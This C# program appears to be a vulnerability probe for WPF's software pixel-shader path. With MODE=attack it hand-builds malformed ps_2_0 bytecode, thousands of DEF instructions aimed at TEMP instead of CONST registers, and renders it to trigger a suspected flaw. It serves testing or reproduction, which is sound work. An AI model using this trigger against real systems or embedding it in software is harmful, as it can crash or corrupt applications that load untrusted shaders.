using System;
using System.Collections.Generic;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Effects;
using System.Windows.Interop;
using System.Windows.Media.Imaging;

// Generic WPF pixel-shader render probe.
//   MODE=benign -> DEF with CONST destination (well-formed)
//   MODE=attack -> DEF with TEMP destination
// Builds a pixel-shader bytecode of GROUPS DEF instructions and renders it through
// the software (WARP) pixel-shader compile path. Prints RENDER_OK on success.
class Program
{
    class MyEffect : ShaderEffect { public MyEffect(PixelShader ps) { PixelShader = ps; } }

    static uint[] Build(int groups, uint dst)
    {
        var t = new List<uint> { 0x00000200 };           // ps_2_0
        for (int g = 0; g < groups; g++)
        {
            t.Add(81);                                   // D3DSIO_DEF
            t.Add(dst);                                  // destination register type
            t.Add(0); t.Add(0); t.Add(0); t.Add(0);       // four value tokens
        }
        t.Add(0x0000FFFF);                               // D3DSIO_END
        return t.ToArray();
    }

    [STAThread]
    static int Main()
    {
        int groups = int.Parse(Environment.GetEnvironmentVariable("GROUPS") ?? "6000");
        string mode = Environment.GetEnvironmentVariable("MODE") ?? "benign";
        uint dst = mode == "benign" ? (2u << 28) : (0u << 28);  // CONST vs TEMP
        var toks = Build(groups, dst);
        byte[] bytes = new byte[toks.Length * 4];
        Buffer.BlockCopy(toks, 0, bytes, 0, bytes.Length);
        Console.WriteLine($"[probe] runtime={Environment.Version} mode={mode} groups={groups} bytes={bytes.Length}");
        RenderOptions.ProcessRenderMode = RenderMode.SoftwareOnly;
        var shader = new PixelShader();
        using (var ms = new MemoryStream(bytes, writable: false))
            shader.SetStreamSource(ms);
        Console.WriteLine("[probe] SetStreamSource ok");
        var el = new Border { Width = 100, Height = 100, Background = Brushes.Aqua,
                              Effect = new MyEffect(shader) };
        el.Measure(new Size(100, 100));
        el.Arrange(new Rect(0, 0, 100, 100));
        var rtb = new RenderTargetBitmap(64, 64, 96, 96, PixelFormats.Pbgra32);
        rtb.Render(el);
        Console.WriteLine("[probe] RENDER_OK");
        return 0;
    }
}
